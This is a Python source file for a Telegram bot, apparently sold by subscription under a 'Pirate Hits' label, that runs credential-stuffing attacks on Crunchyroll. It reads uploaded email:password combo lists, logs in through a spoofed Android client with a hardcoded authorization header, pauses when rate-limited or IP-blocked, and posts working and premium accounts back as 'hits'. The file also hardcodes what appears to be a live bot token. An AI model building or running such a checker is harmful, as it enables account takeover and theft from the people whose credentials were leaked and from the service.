import telebot
import requests
import time
import json
import os
import threading
import http.server
from datetime import datetime, timedelta
import random
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

# ============================================
# CONFIGURATION
# ============================================
API_TOKEN = '8705949010:AAFmCQPSrVEjkWnZ5cbWysghLn1342xhVSs'  # Replace with your actual token (get a fresh one from @BotFather)
bot = telebot.TeleBot(API_TOKEN)

# List of Admin IDs - Replace with your actual Telegram user ID
Admins = ['6024704351']  # Your Telegram ID

# ============================================
# CRUNCHYROLL CHECKER FUNCTION
# ============================================
def check_crunchyroll_account(email, password):
    device_id = ''.join(random.choice('0123456789abcdef') for _ in range(32))
    url = "https://beta-api.crunchyroll.com/auth/v1/token"
    
    # CRITICAL: You MUST update this authorization key if it's outdated!
    # Current key might be different. You can find updated keys online.
    headers = {
        "host": "beta-api.crunchyroll.com",
        "authorization": "Basic d2piMV90YThta3Y3X2t4aHF6djc6MnlSWlg0Y0psX28yMzRqa2FNaXRTbXNLUVlGaUpQXzU=",
        "x-datadog-sampling-priority": "0",
        "etp-anonymous-id": "855240b9-9bde-4d67-97bb-9fb69aa006d1",
        "content-type": "application/x-www-form-urlencoded",
        "accept-encoding": "gzip",
        "user-agent": "Crunchyroll/3.59.0 Android/14 okhttp/4.12.0"
    }
    
    data = {
        "username": email,
        "password": password,
        "grant_type": "password",
        "scope": "offline_access",
        "device_id": device_id,
        "device_name": "SM-G9810",
        "device_type": "samsung SM-G955N"
    }

    try:
        response = requests.post(url, headers=headers, data=data, timeout=10)
        
        # Print response to Render logs for debugging
        print(f"Checking {email} - Status: {response.status_code}")
        print(f"Response: {response.text[:200]}")  # Print first 200 chars
        
        if response.status_code == 200:
            try:
                response_json = response.json()
                
                # Check if we got an access token (means login success)
                if 'access_token' in response_json:
                    scope = str(response_json.get('scope', ''))
                    
                    # Check if it's premium (look for premium-related scopes)
                    if 'premium' in scope.lower() or 'premium' in response.text:
                        return 'premium'
                    else:
                        return 'good'
                else:
                    return 'bad'
            except json.JSONDecodeError:
                print("Could not parse JSON response")
                return 'bad'
                
        elif response.status_code == 401:
            print("Invalid credentials (401)")
            return 'bad'
            
        elif response.status_code == 403:
            print("Access forbidden (403) - Maybe blocked")
            return 'block'
            
        elif response.status_code == 429:
            print("Too many requests (429) - Rate limited")
            return 'block'
            
        else:
            print(f"Unexpected status code: {response.status_code}")
            return 'bad'
            
    except requests.exceptions.Timeout:
        print("Request timed out")
        return 'bad'
    except requests.exceptions.ConnectionError:
        print("Connection error")
        return 'bad'
    except Exception as e:
        print(f"Unexpected error: {e}")
        return 'bad'

# ============================================
# KEYBOARD FUNCTIONS
# ============================================
def create_status_keyboard(results):
    keyboard = InlineKeyboardMarkup()
    keyboard.row(
        InlineKeyboardButton(f"Total: {results['total']}", callback_data="total"),
        InlineKeyboardButton(f"Good: {results['good']}", callback_data="good")
    )
    keyboard.row(
        InlineKeyboardButton(f"Premium: {results['premium']}", callback_data="premium"),
        InlineKeyboardButton(f"Bad: {results['bad']}", callback_data="bad")
    )
    return keyboard

# ============================================
# DATA MANAGEMENT
# ============================================
def load_data():
    try:
        with open('chrunch.json', 'r') as file:
            return json.load(file)
    except FileNotFoundError:
        # Create default file if not found
        default_data = {"subscribers": [{"id": "6024704351", "expiry_date": "2030-12-31"}]}
        with open('chrunch.json', 'w') as file:
            json.dump(default_data, file, indent=4)
        return default_data

def save_data(data):
    with open('chrunch.json', 'w') as file:
        json.dump(data, file, indent=4)

# Load subscribers from file
try:
    with open('chrunch.json', 'r') as file:
        data = json.load(file)
        subscribers = {subscriber['id']: subscriber['expiry_date'] for subscriber in data['subscribers']}
except FileNotFoundError:
    # If file doesn't exist, create it with default data
    data = load_data()
    subscribers = {subscriber['id']: subscriber['expiry_date'] for subscriber in data['subscribers']}

# ============================================
# BOT HANDLERS
# ============================================
@bot.message_handler(commands=['start'])
def send_welcome(message):
    chat_id = str(message.chat.id)
    if chat_id not in subscribers:
        bot.reply_to(message, "Use /chk user:pass, 𝗂𝖿 𝗒𝗈𝗎 𝗐𝖺𝗇𝗍 𝗍𝗈 𝖼𝗁𝖾𝖼𝗄 𝖼𝗈𝗆𝖻𝗈 𝗒𝗈𝗎 𝗁𝖺𝗏𝖾 𝗍𝗈 𝗍𝖺𝗄𝖾 𝖺𝖼𝖼𝖾𝗌𝗌 𝖿𝗋𝗈𝗆 @noobpirate")
        return
    
    expiry_date_str = subscribers[chat_id]
    expiry_date = datetime.strptime(expiry_date_str, '%Y-%m-%d')
    current_date = datetime.now()
    
    if current_date > expiry_date:
        bot.reply_to(message, "Sorry, your premium subscription has expired.")
    else:
        bot.reply_to(message, f"𝖣𝗋𝗈𝗉 Your Combo In User:pass Format As Txt File And Then Live It To Me... 🪄")

@bot.message_handler(content_types=['document'])
def handle_docs(message):
    chat_id = str(message.chat.id)
    if chat_id not in subscribers:
        bot.send_message(message.chat.id, "𝖭𝗈𝗍 𝖿𝗈𝗋 𝗄𝗂𝖽𝗌. 𝖳𝖺𝗄𝖾 𝖺𝖼𝖼𝖾𝗌𝗌 𝖿𝗋𝗈𝗆 .")
        return
    
    file_info = bot.get_file(message.document.file_id)
    downloaded_file = bot.download_file(file_info.file_path)

    with open("combo.txt", 'wb') as new_file:
        new_file.write(downloaded_file)

    with open("combo.txt", 'r') as file:
        combos = file.readlines()

    results = {'total': len(combos), 'good': 0, 'premium': 0, 'bad': 0}

    status_message = bot.send_message(
        message.chat.id,
        "Checking accounts...",
        reply_markup=create_status_keyboard(results)
    )

    for combo in combos:
        try:
            email, password = combo.strip().split(':')
            result = check_crunchyroll_account(email, password)

            if result == 'good':
                results['good'] += 1
                bot.send_message(message.chat.id, text=f"""
===========================
⁪⁬⁮⁮⁮⁮ ‌⏤͟͞⁪⁬⁮⁮⁮⁮𝙋𝙞𝙧𝙖𝙩𝙚⌁𝙃𝙞𝙩𝙨™ </> 
===========================
⌁⌁ Crunchyroll Good Hit ⌁⌁
===========================
[ ⌁ ] User :- {email}
[ ⌁ ] Password:- {password}
[ ⌁ ] Premium : Free
[ ⌁ ] By : @noobpirate
    """)
            elif result == 'premium':
                results['premium'] += 1
                bot.send_message(message.chat.id, text=f"""
===========================
⁪⁬⁮⁮⁮⁮ ‌⏤͟͞⁪⁬⁮⁮⁮⁮𝙋𝙞𝙧𝙖𝙩𝙚⌁𝙃𝙞𝙩𝙨™ </> 
===========================
⌁⌁ Crunchyroll Premium Hit ⌁⌁
===========================
[ ⌁ ] User :- {email}
[ ⌁ ] Password:- {password}
[ ⌁ ] Premium : True
[ ⌁ ] By : @noobpirate
    """)
            elif result == 'block':
                bot.send_message(message.chat.id, text="Sorry, we have to wait 5m due to IP block.")
                time.sleep(360)
            else:
                results['bad'] += 1
                
            time.sleep(2)
            # Update the inline keyboard with the current status
            bot.edit_message_reply_markup(
                message.chat.id,
                status_message.message_id,
                reply_markup=create_status_keyboard(results)
            )
        except ValueError:
            # Skip invalid lines (no colon)
            continue
        except Exception as e:
            print(f"Error processing combo: {e}")
            continue

@bot.message_handler(commands=['chk'])
def handle_chk(message):
    if str(message.chat.id) not in subscribers:
        bot.send_message(message.chat.id, "You are not authorized.")
        return
    
    try:
        command, credentials = message.text.split(' ', 1)
        email, password = credentials.split(':')
        
        result = check_crunchyroll_account(email, password)

        if result == 'good':
            bot.send_message(message.chat.id, text=f"""
===========================
⁪⁬⁮⁮⁮⁮ ‌⏤͟͞⁪⁬⁮⁮⁮⁮𝙋𝙞𝙧𝙖𝙩𝙚⌁𝙃𝙞𝙩𝙨™ </> 
===========================
⌁⌁ Crunchyroll Good Hit ⌁⌁
===========================
[ ⌁ ] User :- {email}
[ ⌁ ] Password:- {password}
[ ⌁ ] Premium : Free
[ ⌁ ] By : @noobpirate
    """)
        elif result == 'premium':
            bot.send_message(message.chat.id, text=f"""
===========================
⁪⁬⁮⁮⁮⁮ ‌⏤͟͞⁪⁬⁮⁮⁮⁮𝙋𝙞𝙧𝙖𝙩𝙚⌁𝙃𝙞𝙩𝙨™ </> 
===========================
⌁⌁ Crunchyroll Premium Hit ⌁⌁
===========================
[ ⌁ ] User :- {email}
[ ⌁ ] Password:- {password}
[ ⌁ ] Premium : True
[ ⌁ ] By : @noobpirate
    """)
        elif result == 'block':
            bot.send_message(message.chat.id, text="Sorry, IP blocked. Try again later.")
        else:
            bot.send_message(message.chat.id, text=f"Bad: {email}:{password}")
    except Exception as e:
        bot.send_message(message.chat.id, text="Invalid format. Use /chk email:password")

# ============================================
# ADMIN COMMANDS
# ============================================
@bot.message_handler(commands=['subscribers'])
def send_subscribers(message):
    if str(message.chat.id) not in Admins:
        bot.send_message(message.chat.id, "You are not authorized to use this command.")
        return

    data = load_data()
    response = ""
    for subscriber in data['subscribers']:
        response += f"ID: {subscriber['id']} - Expiry Date: {subscriber['expiry_date']}\n"

    bot.send_message(message.chat.id, response)

@bot.message_handler(commands=['kick'])
def kick_subscriber(message):
    if str(message.chat.id) not in Admins:
        bot.send_message(message.chat.id, "You are not authorized to use this command.")
        return

    try:
        _, subscriber_id = message.text.split(' ', 1)
        data = load_data()
        data['subscribers'] = [sub for sub in data['subscribers'] if sub['id'] != subscriber_id]
        save_data(data)
        bot.send_message(message.chat.id, f"Subscriber {subscriber_id} has been kicked.")
    except:
        bot.send_message(message.chat.id, "Invalid format. Use /kick <subscriber_id>")

@bot.message_handler(commands=['extend'])
def extend_subscription(message):
    if str(message.chat.id) not in Admins:
        bot.send_message(message.chat.id, "You are not authorized to use this command.")
        return

    try:
        _, subscriber_id, days = message.text.split(' ', 2)
        data = load_data()
        for subscriber in data['subscribers']:
            if subscriber['id'] == subscriber_id:
                expiry_date = datetime.strptime(subscriber['expiry_date'], '%Y-%m-%d')
                new_expiry_date = expiry_date + timedelta(days=int(days))
                subscriber['expiry_date'] = new_expiry_date.strftime('%Y-%m-%d')
                save_data(data)
                bot.send_message(message.chat.id, f"Subscriber {subscriber_id}'s subscription has been extended by {days} days.")
                return
        bot.send_message(message.chat.id, "Subscriber not found.")
    except:
        bot.send_message(message.chat.id, "Invalid format. Use /extend <subscriber_id> <days>")

# ============================================
# HEALTH CHECK SERVER FOR RENDER
# ============================================
class HealthCheckHandler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b'OK')
    def log_message(self, format, *args):
        pass

def start_health_server():
    port = int(os.environ.get("PORT", 8000))
    server = http.server.HTTPServer(("0.0.0.0", port), HealthCheckHandler)
    threading.Thread(target=server.serve_forever, daemon=True).start()

# ============================================
# START THE BOT
# ============================================
if __name__ == '__main__':
    start_health_server()  # Start health check server
    print("🤖 Bot is starting...")
    print(f"Loaded {len(subscribers)} subscribers")
    bot.polling(none_stop=True)
